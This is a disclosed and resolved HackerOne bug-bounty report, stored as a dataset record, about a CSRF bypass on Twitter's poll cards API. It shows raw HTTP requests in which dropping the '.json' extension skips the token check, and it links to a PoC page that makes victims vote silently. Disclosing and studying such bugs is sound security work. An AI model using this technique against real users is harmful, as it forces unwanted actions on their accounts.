---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '95555'
original_report_id: '95555'
title: CSRF on cards API
weakness: Cross-Site Request Forgery (CSRF)
team_handle: x
created_at: '2015-10-24T07:48:10.271Z'
disclosed_at: '2017-04-11T03:26:55.147Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 38
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF on cards API

## Metadata

- HackerOne Report ID: 95555
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: x
- Disclosed At: 2017-04-11T03:26:55.147Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,
I would like to report an CSRF issue on the cards API endpoint (/i/cards/api/v1.json).

##Detail
Currently the endpoint is responsible for poll cards (maybe more to come). When a user votes, a request will be sent to this endpoint to record the user's selected choice. By default there's a CSRF protection in place which looks for *authenticity_token* in the query part of the URI. However, such check only appears for the exact path (*/i/cards/api/v1.json*). Given that the server seems to relax path extension, attackers can circumvent the protection by using the path */i/cards/api/v1* (without .json) for the request.

This is how a normal request looks like:
```http
POST https://twitter.com/i/cards/api/v1.json?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1
Host: twitter.com
Cookie: foo=bar

{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}
```

without providing a valid CSRF token, it will return a HTTP 403 error.
Now that we trim the extension part (**v1.json** to **v1**) and resend it:
```http
POST https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664&card_name=poll2choice_text_only&forward=false&capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1
Host: twitter.com
Cookie: foo=bar

{"twitter:string:card_uri":"card://657629230759415808","twitter:long:original_tweet_id":"657629231309041664","twitter:string:selected_choice":"2"}
```

it still lacks the CSRF token, but this time it returns HTTP 200 and the vote is successfully made.
All in all, attackers can abuse it and make victims to vote without noticing.

#PoC
Here's a handy tool to CSRF any poll. You may also just intercept the vote request to validate the issue.
1. Go to http://innerht.ml/pocs/twitter-cards-csrf/
2. Fill in the poll card's information you want to CSRF (e.g. for https://twitter.com/Bugcrowd/status/657629231309041664 the parameters are
tweet_id: 657629231309041664, card_uri: card://657629230759415808, selected_choice: 2)
3. Click the button to activate the attacke. Of course the whole process can be silent.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
